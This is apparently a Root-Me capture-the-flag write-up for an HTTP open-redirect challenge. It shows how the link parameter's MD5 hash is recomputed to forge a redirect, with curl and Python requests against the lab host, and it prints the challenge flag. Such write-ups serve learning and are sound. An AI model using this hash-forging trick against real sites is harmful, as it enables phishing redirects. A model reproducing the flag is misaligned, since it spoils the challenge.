---
title: HTTP - Open redirect
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation]
---

* Points: 10
* Link: [https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

## Statement

> Find a way to make a redirection to a domain other than those showed on the web page.
>
> [http://challenge01.root-me.org/web-serveur/ch52/](http://challenge01.root-me.org/web-serveur/ch52/)

## Solution

Let's visit the site

```sh
curl http://challenge01.root-me.org/web-serveur/ch52/
```
```html
<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>


<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <h1>Social Networks</h1>
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>
<style type="text/css">
        body{
                text-align: center;
                font-family: arial;
        }

        a{
                color: #FFFFFF;
                text-decoration: none;
                text-transform: capitalize;
                padding: 8px;
                background-color: #1CB2D2;
                border-radius: 5px;
                width: 100px;
                display: inline-block;
        }
        a:hover{
                background-color: #3968A9;
        }

        #error{
                color: red;
                font-weight: bold;
        }

</style>
</body>
</html>
```

Check these lines
```html
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>
```

Sounds like we have a **hash** here. Let's check with [hash-identifier](https://www.kali.org/tools/hash-identifier/)
```console
┌──(user㉿kali)-[~]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: a023cfbf5f1c39bdf8407f28b60cd134

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Well well we got a MD5 hash, use [MD5 decoder tool](https://md5hashing.net/hash/md5), we have ```a023cfbf5f1c39bdf8407f28b60cd134``` is a hash of ```https://facebook.com```.

So let's try any domain, for example, ```https://mydomain.com``` with hash is ```9af3e23ea90265a580cb11bfce830f97```:
```sh
curl http://challenge01.root-me.org/web-serveur/ch52/?url=https://mydomain.com&h=9af3e23ea90265a580cb11bfce830f97
```
But I got ```403 error```, so I try again with python
```python
import requests
flag = requests.get("http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f")
print(flag.text)
```

and...
```html
<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>


<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
</p><script>document.location = 'https://google.com';</script>
<style type="text/css">
        body{
                text-align: center;
                font-family: arial;
        }

        a{
                color: #FFFFFF;
                text-decoration: none;
                text-transform: capitalize;
                padding: 8px;
                background-color: #1CB2D2;
                border-radius: 5px;
                width: 100px;
                display: inline-block;
        }
        a:hover{
                background-color: #3968A9;
        }

        #error{
                color: red;
                font-weight: bold;
        }

</style>
</body>
</html>
```

Here we go
```html
<p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
```
The flag is
```
e6f8a530811d5a479812d7b82fc1a5c5
```
